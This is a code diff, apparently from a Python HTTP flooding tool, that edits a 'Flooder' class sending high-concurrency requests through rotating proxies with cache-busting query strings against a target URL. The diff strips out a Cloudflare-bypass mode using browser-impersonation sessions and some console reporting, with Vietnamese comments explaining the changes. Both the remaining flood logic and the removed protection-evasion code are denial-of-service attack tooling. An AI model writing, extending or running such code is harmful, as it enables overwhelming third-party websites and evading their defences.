@@ -6,7 +6,6 @@ from dataclasses import dataclass, field
 
 import httpx
 
-from .cf_bypass import IMPERSONATE_PROFILES, make_session
 from .proxy_manager import ProxyManager
 
 
@@ -43,12 +42,11 @@ class Stats:
 
 class Flooder:
     def __init__(self, target: str, proxies: ProxyManager,
-                 method="GET", threads=200, use_cf_bypass=True, rps_limit=0):
+                 method="GET", threads=200, rps_limit=0): # Đã xóa use_cf_bypass
         self.target = target
         self.proxies = proxies
         self.method = method.upper()
         self.threads = threads
-        self.use_cf_bypass = use_cf_bypass
         self.rps_limit = rps_limit
         self.stats = Stats()
         self._stop = asyncio.Event()
@@ -59,36 +57,6 @@ class Flooder:
     def _cache_buster(self):
         sep = "&" if "?" in self.target else "?"
         return f"{self.target}{sep}{rand_string(12)}={rand_string(16)}"
-
-    def _cffi_request(self, proxy):
-        """Blocking — runs in thread pool."""
-        profile = random.choice(IMPERSONATE_PROFILES)
-        session = make_session(proxy=proxy.url(), profile=profile)
-        url = self._cache_buster()
-        try:
-            if self.method == "GET":
-                r = session.get(url, timeout=10)
-            else:
-                r = session.post(url, data={"x": rand_string(64)}, timeout=10)
-            self.stats.ok += 1
-            self.stats.bytes_recv += len(r.content)
-            self.proxies.mark_ok(proxy)
-        except Exception:
-            self.stats.fail += 1
-            self.proxies.mark_fail(proxy)
-        finally:
-            self.stats.sent += 1
-
-    async def _cffi_worker(self, wid: int):
-        loop = asyncio.get_running_loop()
-        while not self._stop.is_set():
-            proxy = await self.proxies.get()
-            if proxy is None:
-                await asyncio.sleep(0.5)
-                continue
-            await loop.run_in_executor(None, self._cffi_request, proxy)
-            if self.rps_limit > 0:
-                await asyncio.sleep(1.0 / self.rps_limit)
 
     async def _httpx_worker(self, wid: int):
         while not self._stop.is_set():
@@ -124,16 +92,13 @@ class Flooder:
                 await asyncio.sleep(1.0 / self.rps_limit)
 
     async def run(self, duration: int = 0):
-        workers = (
-            [asyncio.create_task(self._cffi_worker(i)) for i in range(self.threads)]
-            if self.use_cf_bypass else
-            [asyncio.create_task(self._httpx_worker(i)) for i in range(self.threads)]
-        )
+        # Chỉ còn 1 loại worker là httpx
+        workers = [asyncio.create_task(self._httpx_worker(i)) for i in range(self.threads)]
 
         async def reporter():
+            # Bỏ phần in ra console vì main.py đã dùng Rich UI để vẽ
             while not self._stop.is_set():
                 await asyncio.sleep(1)
-                print(self.stats.report())
 
         rep = asyncio.create_task(reporter())
 
@@ -148,4 +113,3 @@ class Flooder:
         rep.cancel()
         for w in workers:
             w.cancel()
-        print("\n" + self.stats.report())
